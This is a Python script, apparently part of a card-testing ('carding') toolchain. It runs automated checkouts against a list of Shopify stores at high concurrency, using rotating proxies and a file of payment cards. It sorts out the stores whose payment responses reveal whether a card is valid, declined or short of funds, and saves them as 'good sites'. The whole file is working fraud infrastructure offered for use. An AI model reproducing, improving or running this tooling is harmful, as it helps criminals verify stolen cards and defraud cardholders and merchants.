#!/usr/bin/env python3
"""Shopify site validator — full checkout per site; keep sites that give real card responses.

Real responses (KEEP): CHARGED / APPROVED / DECLINED (incl. card_declined, 3ds, insufficient_funds).
Everything else (REMOVE): dead site, login required, stable id not found, no products, challenges, etc.
"""
import asyncio, sys, os, json, time, argparse
from pathlib import Path

BASE = Path(__file__).resolve().parent
sys.path.insert(0, str(BASE))

from auto_async_v2 import run_checkout_for_card_async, normalize_proxy
from auto import CheckStatus

_REAL_RESULTS = (
    "CARD_DECLINED", "ORDER_PAID", "INSUFFICIENT_FUNDS", "3DS_REQUIRED",
    "INVALID_PAYMENT_METHOD", "INVALID_CVC", "INCORRECT_CVC", "EXPIRED",
    "INVALID_PURCHASE_TYPE", "TEST_MODE_LIVE_CARD", "DECISION_RULE_BLOCK",
    "AMOUNT_TOO_SMALL", "TRANSACTION_NOT_ALLOWED", "RESTRICTED_CARD",
    "DO_NOT_HONOR", "GENERIC_DECLINE", "PROCESSING_ERROR", "PICK_UP_CARD",
)


def load(path):
    p = Path(path)
    if not p.is_file():
        raise SystemExit(f"missing file: {p}")
    return [l.strip() for l in p.read_text(errors="ignore").splitlines()
            if l.strip() and not l.strip().startswith("#")]


async def run_one(i, site, cc, proxy, sem):
    async with sem:
        t0 = time.time()
        try:
            res = await run_checkout_for_card_async(site, cc, proxy)
        except Exception as e:
            return (site, "EXCEPTION", "", "0.00", str(e)[:120], False, round(time.time()-t0, 1))
        code = (res.status_code or "").strip().upper() or "UNKNOWN"
        err = str(res.error)[:140].replace("\n", " ") if res.error else ""
        status_name = res.status.name if res.status is not None else "ERROR"
        real = res.status != CheckStatus.ERROR or code in _REAL_RESULTS
        return (site, status_name, code, res.amount or "0.00", err, real, round(time.time()-t0, 1))


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--sites", default=str(BASE / "site.txt"))
    ap.add_argument("--proxies", required=True)
    ap.add_argument("--cc-file", default=str(BASE.parent / "archive" / "test" / "all_cards.txt"))
    ap.add_argument("--concurrency", type=int, default=500)
    ap.add_argument("--out", default="/tmp/shopify_sitecheck")
    a = ap.parse_args()

    sites = load(a.sites)
    proxies = load(a.proxies)
    cards = load(a.cc_file)
    os.makedirs(a.out, exist_ok=True)

    sem = asyncio.Semaphore(max(1, a.concurrency))
    print(f"== Shopify site check: {len(sites)} sites, {len(proxies)} proxies, {len(cards)} cards, {a.concurrency} concurrent ==", flush=True)

    jobs = []
    for i, site in enumerate(sites):
        cc = cards[i % len(cards)]
        proxy = normalize_proxy(proxies[i % len(proxies)])
        jobs.append(run_one(i, site, cc, proxy, sem))

    results = await asyncio.gather(*jobs)

    good, removed = [], []
    logf = open(os.path.join(a.out, "results.log"), "w", buffering=1)
    for site, status, code, amount, err, real, dur in results:
        line = f"{status:<10} {code:<28} {amount:>8} {dur:>6}s  {site}"
        logf.write(line + ("  | " + err if err and not real else "") + "\n")
        print(line, flush=True)
        if real:
            good.append(site)
        else:
            removed.append((site, status, code, err))

    with open(os.path.join(a.out, "good_sites.txt"), "w") as f:
        f.write("\n".join(good) + ("\n" if good else ""))
    with open(os.path.join(a.out, "removed_sites.txt"), "w") as f:
        for site, status, code, err in removed:
            f.write(f"{site}  [{status}] {code} {err}\n")
    with open(os.path.join(a.out, "summary.json"), "w") as f:
        json.dump({"total": len(sites), "good": len(good), "removed": len(removed),
                   "good_sites": good}, f, indent=2)
    logf.close()
    print(f"== DONE == good={len(good)} removed={len(removed)} -> {a.out}", flush=True)


if __name__ == "__main__":
    asyncio.run(main())
